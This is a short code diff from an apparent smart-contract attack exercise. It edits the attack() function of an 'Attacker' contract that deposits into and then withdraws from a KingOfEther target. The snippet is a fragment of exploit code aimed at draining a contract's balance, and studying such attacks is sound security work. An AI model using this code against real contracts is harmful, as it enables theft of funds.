@@ -15,7 +15,7 @@ contract Attacker is KingOfEther{
 
     function attack() public payable{
         require(msg.value > 0,"sendSomething");
-        _kingOf.deposit();
+        _kingOf.deposit(1 ether);
         if(_kingOf.balance()>0){
             _kingOf.withdraw();
             (bool ok,)=payable(address(this)).call{value:msg.value}("");
